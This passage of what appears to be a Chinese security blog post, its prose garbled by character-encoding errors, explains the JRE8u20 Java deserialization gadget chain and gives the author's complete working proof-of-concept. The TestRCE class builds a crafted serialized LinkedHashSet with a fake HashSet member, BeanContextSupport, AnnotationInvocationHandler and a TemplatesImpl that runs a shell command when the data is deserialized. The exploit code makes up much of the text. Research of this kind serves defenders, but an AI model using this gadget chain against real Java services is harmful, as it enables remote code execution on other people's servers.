        Serialization ser = new Serialization();
        // wrong passcode ï¼Œååºåˆ—åŒ–æ—¶ä¼šå‡ºç°å¼‚å¸¸
        Passcode passcode = new Passcode("wrong passcode"); 
        TCClassDesc desc = new TCClassDesc(
        "util.n1nty.testpayload.WrapperClass", 
    (byte)(SC_SERIALIZABLE | SC_WRITE_METHOD));
        TCObject.ObjectData data = new TCObject.ObjectData();
        // å°† passcode æ·»åŠ åˆ° WrapperClass å¯¹è±¡çš„æ•°æ®åŒº
        // ä½¿å¾— WrapperClass.readObject å†…éƒ¨çš„ input.readObject 
        // å¯ä»¥å°†å®ƒè¯»å‡º
        data.addData(passcode); 
        TCObject obj = new TCObject(ser);
        obj.addClassDescData(desc, data, true);
        ser.addObject(obj);
        // è¿™é‡Œæœ€ç»ˆå†™å…¥çš„æ˜¯ä¸€ä¸ª TC_REFERENCE
        ser.addObject(passcode); 
        ser.write("/tmp/ser");
        ObjectInputStream in = new ObjectInputStream(
        new FileInputStream(new File("/tmp/ser")));
        in.readObject();
        System.out.println(in.readObject());
    }
**ç»™å¯¹è±¡æ’å…¥å‡æˆå‘˜**
****
ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿåºåˆ—åŒ–æ•°æ®ä¸­ï¼Œæœ‰ä¸€æ®µåä¸º TC_CLASSDESC
çš„æ•°æ®ç»“æ„ï¼Œæ­¤æ•°æ®ç»“æ„ä¸­ä¿å­˜äº†è¢«åºåˆ—åŒ–çš„å¯¹è±¡æ‰€å±çš„ç±»çš„æˆå‘˜ç»“æ„ï¼ˆæœ‰å¤šå°‘ä¸ªæˆå‘˜ï¼Œåˆ†åˆ«å«ä»€ä¹ˆåå­—ï¼Œä»¥åŠéƒ½æ˜¯ä»€ä¹ˆç±»å‹çš„ã€‚ï¼‰
è¿˜æ˜¯æ‹¿ä¸Šé¢çš„ Passcode ç±»æ¥åšä¾‹å­ï¼Œåºåˆ—åŒ–ä¸€ä¸ª Passcode ç±»çš„å¯¹è±¡åï¼Œä½ ä¼šå‘ç°å®ƒçš„ TC_CLASSDESC çš„ç»“æ„å¦‚ä¸‹ï¼š
        TC_CLASSDESC - 0x72
                  className
                    Length - 31 - 0x00 1f    // ç±»åé•¿åº¦
                    Value - util.n1nty.testpayload.Passcode - 0x7574696c2e6e316e74792e746573747061796c6f61642e50617373636f6465    //ç±»å
                  serialVersionUID - 0x00 00 00 00 00 00 00 64
                  newHandle 0x00 7e 00 02
                  classDescFlags - 0x02 - SC_SERIALIZABLE
                  fieldCount - 1 - 0x00 01    // æˆå‘˜æ•°é‡ï¼Œåªæœ‰ 1 ä¸ª
                  Fields
                    0:
                      Object - L - 0x4c    
                      fieldName
                        Length - 8 - 0x00 08    // æˆå‘˜åé•¿åº¦
                        Value - passcode - 0x70617373636f6465    // æˆå‘˜å
                      className1
                        TC_STRING - 0x74    
                          newHandle 0x00 7e 00 03
                          Length - 18 - 0x00 12    // æˆå‘˜ç±»å‹åçš„é•¿åº¦
                          Value - Ljava/lang/String; - 0x4c6a6176612f6c616e672f537472696e673b    // æˆå‘˜ç±»å‹ï¼Œä¸ºLjava/lang/String;
å¦‚æœæˆ‘ä»¬åœ¨è¿™æ®µç»“æ„ä¸­ï¼Œæ’å…¥ä¸€ä¸ª Passcode ç±»ä¸­æ ¹æœ¬ä¸å­˜åœ¨çš„æˆå‘˜ï¼Œä¹Ÿä¸ä¼šæœ‰ä»»ä½•é—®é¢˜ã€‚è¿™ä¸ªè™šå‡çš„å€¼ä¼šè¢«ååºåˆ—åŒ–å‡ºæ¥ï¼Œä½†æ˜¯æœ€ç»ˆä¼šè¢«æŠ›å¼ƒæ‰ï¼Œå› ä¸º
Passcode ä¸­ä¸å­˜åœ¨ç›¸åº”çš„æˆå‘˜ã€‚ä½†æ˜¯å¦‚æœè¿™ä¸ªå€¼æ˜¯ä¸€ä¸ªå¯¹è±¡çš„è¯ï¼Œååºåˆ—åŒ–æœºåˆ¶ä¼šä¸ºè¿™ä¸ªå€¼åˆ†é…ä¸€ä¸ª Handleã€‚JRE8u20 ä¸­åˆ©ç”¨åˆ°äº†è¿™ä¸ªæŠ€å·§æ¥ç”Ÿæˆ
AnnotationInvocationHandler å¹¶åœ¨éšåçš„åŠ¨æ€ä»£ç†å¯¹è±¡ä¸­å¼•ç”¨å®ƒã€‚åˆ©ç”¨ ObjectOutputStream
æˆ‘ä»¬æ˜¯æ— æ³•åšåˆ°æ·»åŠ å‡æˆå‘˜çš„ï¼Œè¿™ç§åœºæ™¯ä¸‹ SerialWriter å°±æ´¾ä¸Šäº†ç”¨åœºã€‚ï¼ˆç±»ä¼¼çš„æŠ€å·§è¿˜æœ‰ï¼šåœ¨ TC_CLASSDESC ä¸­æŠŠä¸€ä¸ªç±»æ ‡è®°ä¸º
SC_WRITE_METHODï¼Œç„¶åå°±å¯ä»¥å‘è¿™ä¸ªç±»çš„æ•°æ®åŒºåŸŸå°¾éƒ¨éšæ„æ·»åŠ ä»»ä½•æ•°æ®ï¼Œè¿™äº›æ•°æ®éƒ½ä¼šåœ¨è¿™ä¸ªç±»è¢«ååºåˆ—åŒ–çš„åŒæ—¶ä¹Ÿè‡ªåŠ¨è¢«ååºåˆ—åŒ–ï¼‰
**å›åˆ°ä¸»é¢˜ â€“ Payload JRE8u20**
****
ä¸Šé¢å·²ç»åˆ†æè¿‡æ˜¯ä»€ä¹ˆé—®é¢˜å¯¼è‡´äº† Jdk7u21 ä¸èƒ½åœ¨æ–°ç‰ˆæœ¬ä¸­ä½¿ç”¨ã€‚ä¹Ÿç”¨äº†å‡ ä¸ªç®€å•çš„å®éªŒæ¥å‘å¤§å®¶å±•ç¤ºäº†å¦‚ä½•ç»•è¿‡è¿™ä¸ªé—®é¢˜ã€‚é‚£ä¹ˆç°åœ¨å›åˆ°ä¸»é¢˜ã€‚
JRE8u20 ä¸­åˆ©ç”¨åˆ°äº†åä¸º java.beans.beancontext.BeanContextSupport çš„ç±»ã€‚ æ­¤ç±»ä¸ä¸Šé¢å®éªŒæ‰€ç”¨åˆ°çš„
WrapperClass çš„ä½œç”¨æ˜¯ä¸€æ ·çš„ï¼Œåªä¸è¿‡ç¨å¤æ‚ä¸€äº›ã€‚
å¤§ä½“æ­¥éª¤å¦‚ä¸‹ï¼š
JRE8u20 ä¸­å‘ HashSet çš„ TC_CLASSDESC ä¸­æ·»åŠ äº†ä¸€ä¸ªå‡å±æ€§ï¼Œå±æ€§çš„å€¼å°±æ˜¯BeanContextChild ç±»çš„å¯¹è±¡ã€‚
BeanContextSupport åœ¨ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­ä¼šè¯»åˆ° this.type å€¼ä¸º Templates.class çš„
AnnotationInvocationHandler ç±»çš„å¯¹è±¡ï¼Œå› ä¸º BeanContextChild ä¸­æœ‰ try/catchï¼Œæ‰€ä»¥è¿˜åŸ
AnnotationInvocationHandler å¯¹è±¡æ—¶å‡ºçš„å¼‚å¸¸è¢«å¤„ç†æ‰äº†ï¼Œæ²¡æœ‰æ‰“æ–­ååºåˆ—åŒ–çš„é€»è¾‘ã€‚åŒæ—¶
AnnotationInvocationHandler å¯¹è±¡è¢«åˆ†é…äº†ä¸€ä¸ª handleã€‚
ç„¶åå°±æ˜¯ç»§ç»­ Jdk7u21 çš„æµç¨‹ï¼Œåç»­çš„ payload ç›´æ¥å¼•ç”¨äº†ä¹‹å‰åˆ›å»ºå‡ºæ¥çš„ AnnotationInvocationHandler ã€‚
pwntester åœ¨ github ä¸Šä¼ äº†ä»–æ”¹çš„ Pocï¼Œä½†æ˜¯å› ä¸ºä»–ç›´æ¥å°†åºåˆ—åŒ–æ–‡ä»¶çš„ç»“æ„å†™åœ¨äº† Java æ–‡ä»¶çš„ä¸€ä¸ªæ•°ç»„é‡Œé¢ï¼Œè€Œä¸”å¯¹è±¡é—´çš„ handle
ä¸ TC_REFERENCE çš„å€¼éƒ½éœ€è¦äººå·¥æ‰‹åŠ¨ä¿®æ­£ï¼Œæ‰€ä»¥éå¸¸ä¸ç›´è§‚ã€‚è€Œä¸”æ‰‹åŠ¨ä¿®æ­£ handle æ˜¯ä¸€ä¸ªå¾ˆçƒ¦äººçš„äº‹æƒ…ã€‚
ä¸ºäº†è¯æ˜æˆ‘ä¸æ˜¯ä¸€ä¸ªç†è®ºæ´¾ ğŸ™‚ ï¼Œæˆ‘ç”¨ SerialWriter é‡æ–°å®ç°äº†æ•´ä¸ª Pocã€‚ä»£ç å¦‚ä¸‹ï¼šï¼ˆæ‰‹æœºç«¯çœ‹ä¸å…¨ä»£ç ï¼Œåœ¨ç”µè„‘ä¸Šçœ‹å§ï¼‰
    package util.n1nty.testpayload;
    import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
    import util.Gadgets;
    import util.Reflections;
    import util.n1nty.gen.*;
    import javax.xml.transform.Templates;
    import java.beans.beancontext.BeanContextChild;
    import java.beans.beancontext.BeanContextSupport;
    import java.io.*;
    import java.util.HashMap;
    import java.util.Map;
    import static java.io.ObjectStreamConstants.*;
    public class TestRCE {
        public static Templates makeTemplates(String command) {
            TemplatesImpl templates = null;
            try {
                templates =  Gadgets.createTemplatesImpl(command);
                Reflections.setFieldValue(templates, "_auxClasses", null);
            } catch (Exception e) {
                e.printStackTrace();
            }
            return templates;
        }
        public static TCObject makeHandler(HashMap map, Serialization ser) throws Exception {
            TCObject handler = new TCObject(ser) {
                @Override
                public void doWrite(DataOutputStream out, HandleContainer handles) throws Exception {
                    ByteArrayOutputStream byteout = new ByteArrayOutputStream();
                    super.doWrite(new DataOutputStream(byteout), handles);
                    byte[] bytes = byteout.toByteArray();
                    /**
                     * å»æ‰æœ€åçš„ TC_ENDBLOCKDATA å­—èŠ‚ã€‚å› ä¸ºåœ¨ååºåˆ—åŒ– annotation invocation handler çš„è¿‡ç¨‹ä¸­ä¼šå‡ºç°å¼‚å¸¸å¯¼è‡´åºåˆ—åŒ–çš„è¿‡ç¨‹ä¸èƒ½æ­£å¸¸ç»“æŸ
                     * ä»è€Œå¯¼è‡´ TC_ENDBLOCKDATA è¿™ä¸ªå­—èŠ‚ä¸èƒ½è¢«æ­£å¸¸åƒæ‰
                     * æˆ‘ä»¬å°±ä¸èƒ½ç”Ÿæˆè¿™ä¸ªå­—èŠ‚
                     * */
                    out.write(bytes, 0, bytes.length -1);
                }
            };
            // æ‰‹åŠ¨æ·»åŠ   SC_WRITE_METHODï¼Œå¦åˆ™ä¼šå› ä¸ºååºåˆ—åŒ–è¿‡ç¨‹ä¸­çš„å¼‚å¸¸å¯¼è‡´ ois.defaultDataEnd ä¸º trueï¼Œå¯¼è‡´æµä¸å¯ç”¨ã€‚
            TCClassDesc desc = new TCClassDesc("sun.reflect.annotation.AnnotationInvocationHandler", (byte)(SC_SERIALIZABLE | SC_WRITE_METHOD));
            desc.addField(new TCClassDesc.Field("memberValues", Map.class));
            desc.addField(new TCClassDesc.Field("type", Class.class));
            TCObject.ObjectData data = new TCObject.ObjectData();
            data.addData(map);
            data.addData(Templates.class);
            handler.addClassDescData(desc, data);
            return handler;
        }
        public static TCObject makeBeanContextSupport(TCObject handler, Serialization ser) throws Exception {
            TCObject obj = new TCObject(ser);
            TCClassDesc beanContextSupportDesc = new TCClassDesc("java.beans.beancontext.BeanContextSupport");
            TCClassDesc beanContextChildSupportDesc = new TCClassDesc("java.beans.beancontext.BeanContextChildSupport");
            beanContextSupportDesc.addField(new TCClassDesc.Field("serializable", int.class));
            TCObject.ObjectData beanContextSupportData = new TCObject.ObjectData();
            beanContextSupportData.addData(1); // serializable
            beanContextSupportData.addData(handler);
            beanContextSupportData.addData(0, true); // é˜²æ­¢ deserialize å†…å†æ‰§è¡Œ readObject
            beanContextChildSupportDesc.addField(new TCClassDesc.Field("beanContextChildPeer", BeanContextChild.class));
            TCObject.ObjectData beanContextChildSupportData = new TCObject.ObjectData();
            beanContextChildSupportData.addData(obj); // æŒ‡å›è¢«åºåˆ—åŒ–çš„ BeanContextSupport å¯¹è±¡
            obj.addClassDescData(beanContextSupportDesc, beanContextSupportData, true);
            obj.addClassDescData(beanContextChildSupportDesc, beanContextChildSupportData);
            return obj;
        }
        public static void main(String[] args) throws Exception {
            Serialization ser = new Serialization();
            Templates templates = makeTemplates("open /Applications/Calculator.app");
            HashMap map = new HashMap();
            map.put("f5a5a608", templates);
            TCObject handler = makeHandler(map, ser);
            TCObject linkedHashset = new TCObject(ser);
            TCClassDesc linkedhashsetDesc = new TCClassDesc("java.util.LinkedHashSet");
            TCObject.ObjectData linkedhashsetData = new TCObject.ObjectData();
            TCClassDesc hashsetDesc = new TCClassDesc("java.util.HashSet");
            hashsetDesc.addField(new TCClassDesc.Field("fake", BeanContextSupport.class));
            TCObject.ObjectData hashsetData = new TCObject.ObjectData();
            hashsetData.addData(makeBeanContextSupport(handler, ser));
            hashsetData.addData(10, true); // capacity
            hashsetData.addData(1.0f, true); // loadFactor
            hashsetData.addData(2, true); // size
            hashsetData.addData(templates);
            TCObject proxy = Util.makeProxy(new Class[]{Map.class}, handler, ser);
            hashsetData.addData(proxy);
            linkedHashset.addClassDescData(linkedhashsetDesc, linkedhashsetData);
            linkedHashset.addClassDescData(hashsetDesc, hashsetData, true);
            ser.addObject(linkedHashset);
            ser.write("/tmp/ser");
            ObjectInputStream in = new ObjectInputStream(new FileInputStream(new File("/tmp/ser")));
            System.out.println(in.readObject());
        }
    }
æœ‰å¯¹æ–‡ç« å†…å®¹æ„Ÿå…´è¶£çš„å°ä¼™ä¼´å¯ä»¥åŠ ä½œè€…çš„å¾®ä¿¡å·å…¬ä¼—å· **n1nty-talks** ï¼Œæ¬¢è¿æŠ€æœ¯äº¤æµã€‚
**å‚è€ƒèµ„æ–™**
****
è¿™ä¸€ç¯‡èµ„æ–™å¸®åŠ©éå¸¸å¤§ï¼Œæ•´ä¸ª payload çš„æ€è·¯å°±æ˜¯è¿™ç¯‡æ–‡ç« æå‡ºæ¥çš„ã€‚ä½œè€…å¯¹åºåˆ—åŒ–æœºåˆ¶æœ‰é•¿æ—¶é—´çš„æ·±å…¥ç ”ç©¶ã€‚